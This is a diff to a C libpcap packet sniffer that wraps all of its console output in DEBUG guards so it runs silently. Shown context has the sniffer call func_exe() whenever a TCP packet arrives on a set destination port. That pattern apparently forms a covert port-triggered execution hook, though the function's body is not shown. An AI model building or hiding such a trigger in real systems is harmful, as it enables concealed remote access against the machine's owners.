@@ -366,8 +366,9 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	int size_ip;
 	int size_tcp;
 	int size_payload;
-
+#ifdef DEBUG
 	printf("\nPacket number %d:\n", count);
+#endif
 	count++;
 
 	/* define ethernet header */
@@ -377,10 +378,13 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
 	size_ip = IP_HL(ip)*4;
 	if (size_ip < 20) {
+#ifdef DEBUG
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
+#endif
 		return;
 	}
 
+#ifdef DEBUG
 	/* print source and destination IP addresses */
 	printf("       From: %s\n", inet_ntoa(ip->ip_src));
 	printf("         To: %s\n", inet_ntoa(ip->ip_dst));
@@ -403,7 +407,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 			printf("   Protocol: unknown\n");
 			return;
 	}
-
+#endif
 	/*
 	 *  OK, this packet is TCP.
 	 */
@@ -412,13 +416,15 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
 	size_tcp = TH_OFF(tcp)*4;
 	if (size_tcp < 20) {
+#ifdef DEBUG
 		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
+#endif
 		return;
 	}
-
+#ifdef DEBUG
 	printf("   Src port: %d\n", ntohs(tcp->th_sport));
 	printf("   Dst port: %d\n", ntohs(tcp->th_dport));
-
+#endif
     if(ntohs(tcp->th_dport) == PORT) {
         func_exe();
     }
@@ -433,11 +439,12 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	 * Print payload data; it might be binary, so don't just
 	 * treat it as a string.
 	 */
+#ifdef DEBUG
 	if (size_payload > 0) {
 		printf("   Payload (%d bytes):\n", size_payload);
 		print_payload(payload, size_payload);
 	}
-
+#endif
 return;
 }
 
@@ -454,7 +461,9 @@ int main(int argc, char **argv)
 	bpf_u_int32 net;			/* ip */
 	int num_packets = 300;			/* number of packets to capture */
 
+#ifdef DEBUG
 	print_app_banner();
+#endif
 
 	/* check for capture device name on command-line */
 	if (argc == 2) {
@@ -483,10 +492,12 @@ int main(int argc, char **argv)
 		mask = 0;
 	}
 
+#ifdef DEBUG
 	/* print capture info */
 	printf("Device: %s\n", dev);
 	printf("Number of packets: %d\n", num_packets);
 	printf("Filter expression: %s\n", filter_exp);
+#endif
 
 	/* open capture device */
 	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
@@ -522,7 +533,9 @@ int main(int argc, char **argv)
 	pcap_freecode(&fp);
 	pcap_close(handle);
 
+#ifdef DEBUG
 	printf("\nCapture complete.\n");
+#endif
 
 return 0;
 }
